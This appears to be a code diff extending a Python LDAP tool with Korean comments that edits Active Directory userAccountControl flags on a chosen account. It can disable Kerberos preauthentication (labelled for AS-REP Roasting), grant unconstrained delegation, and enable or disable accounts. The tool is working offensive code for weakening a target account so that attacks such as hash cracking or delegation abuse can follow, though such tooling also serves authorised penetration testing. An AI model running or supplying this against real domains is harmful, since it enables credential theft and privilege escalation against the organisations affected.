@@ -1,50 +1,76 @@
-import ldap
-import ldap.modlist as modlist
-import argparse
-parser = argparse.ArgumentParser(description="It is just tool to modify userAccountControl contribute")
-parser.add_argument("-dc-ip", help="Domain Controller Ip Address", required=True)
-parser.add_argument("-d", "--domain", help="Target domain", required=True)
-parser.add_argument("-u", help="Username who has permission can modify userAccountControl", required=True)
-parser.add_argument("-p", help="User Password who has permission can modify userAccountControl", required=True)
-parser.add_argument("--target", help="Target username who can be modified by others", required=True)
+#!/usr/bin/env python3
+import ldap, argparse, sys
+
+# userAccountControl 비트값
+DONT_REQ_PREAUTH        = 0x00400000   # AS-REP Roasting
+ACCOUNTDISABLE          = 0x00000002   # 계정 비활성
+TRUSTED_FOR_DELEGATION  = 0x00080000   # Unconstrained Delegation ← NEW
+
+parser = argparse.ArgumentParser(
+    description="Modify userAccountControl flags (AS-REP, Disable/Enable, Delegation)"
+)
+parser.add_argument("-dc-ip", required=True, help="Domain Controller IP")
+parser.add_argument("-d", "--domain", required=True, help="Domain (contoso.com)")
+parser.add_argument("-u", required=True, help="Username with write permission")
+parser.add_argument("-p", required=True, help="Password")
+parser.add_argument("--target", required=True, help="Target sAMAccountName")
+
+# 옵션들
+parser.add_argument("--asrep", choices=["enable", "disable"],
+                    help="enable/disable DONT_REQ_PREAUTH")
+parser.add_argument("--delegation", choices=["enable", "disable"],
+                    help="enable/disable TRUSTED_FOR_DELEGATION")
+dg = parser.add_mutually_exclusive_group()
+dg.add_argument("--disable", action="store_true", help="Disable account")
+dg.add_argument("--enable",  action="store_true", help="Enable account")
+
 args = parser.parse_args()
 
-ipAddr = args.dc_ip
-userName = args.u
-userPass = args.p
-domain = args.domain
-target = args.target
+LDAP_SERVER = f"ldap://{args.dc_ip}"
+BIND_DN     = f"{args.u}@{args.domain}"
+BASE_DN     = ",".join(f"DC={p}" for p in args.domain.split("."))
+TARGET_USER = args.target
 
-LDAP_SERVER = 'ldap://' + ipAddr
-USERNAME = userName + '@' + domain
-PASSWORD = userPass
-BASE_DN = ','.join(['DC=' + part for part in domain.split('.')])
-TARGET_USER = target
-
-conn = ldap.initialize(LDAP_SERVER)
-conn.set_option(ldap.OPT_REFERRALS, 0)
-conn.simple_bind_s(USERNAME, PASSWORD)
-
-search_filter = f"(sAMAccountName={TARGET_USER})"
-result = conn.search_s(BASE_DN, ldap.SCOPE_SUBTREE, search_filter, ['distinguishedName', 'userAccountControl'])
-if not result:
-    print("The target user does not exist in domain.")
-    exit(1)
-
-dn, attrs = result[0]
-uac = int(attrs['userAccountControl'][0].decode())
-
-DONT_REQ_PREAUTH = 4194304
-new_uac = uac | DONT_REQ_PREAUTH
-mods = [(ldap.MOD_REPLACE, 'userAccountControl', str(new_uac).encode())]
 try:
-    conn.modify_s(dn, mods)
-    print(f"[+] {TARGET_USER} Successfully modified on userAccountControl ({uac} → {new_uac})")
-except ldap.INSUFFICIENT_ACCESS:
-    print(f"[-] Permission Denied.")
-    exit(1)
+    conn = ldap.initialize(LDAP_SERVER)
+    conn.set_option(ldap.OPT_REFERRALS, 0)
+    conn.simple_bind_s(BIND_DN, args.p)
 except ldap.LDAPError as e:
-    print(f"[-] There is something wrong with LDAP : {e}")
-    exit(1)
-conn.unbind()
+    print(f"[-] LDAP bind failed: {e}")
+    sys.exit(1)
 
+flt = f"(sAMAccountName={TARGET_USER})"
+res = conn.search_s(BASE_DN, ldap.SCOPE_SUBTREE, flt,
+                    ["distinguishedName", "userAccountControl"])
+if not res:
+    print("[-] Target not found.")
+    sys.exit(1)
+
+dn, attrs = res[0]
+cur_uac = int(attrs["userAccountControl"][0].decode())
+new_uac = cur_uac
+
+# AS-REP
+if   args.asrep == "enable":  new_uac |= DONT_REQ_PREAUTH
+elif args.asrep == "disable": new_uac &= ~DONT_REQ_PREAUTH
+# Delegation
+if   args.delegation == "enable":  new_uac |= TRUSTED_FOR_DELEGATION
+elif args.delegation == "disable": new_uac &= ~TRUSTED_FOR_DELEGATION
+# 계정 활성/비활성
+if args.disable: new_uac |=  ACCOUNTDISABLE
+if args.enable:  new_uac &= ~ACCOUNTDISABLE
+
+if new_uac == cur_uac:
+    print("[*] No change requested -- already in desired state.")
+    conn.unbind(); sys.exit(0)
+
+try:
+    conn.modify_s(dn, [(ldap.MOD_REPLACE, "userAccountControl",
+                        str(new_uac).encode())])
+    print(f"[+] {TARGET_USER} userAccountControl: {cur_uac} → {new_uac}")
+except ldap.INSUFFICIENT_ACCESS:
+    print("[-] Permission denied.")
+except ldap.LDAPError as e:
+    print(f"[-] LDAP error: {e}")
+finally:
+    conn.unbind()
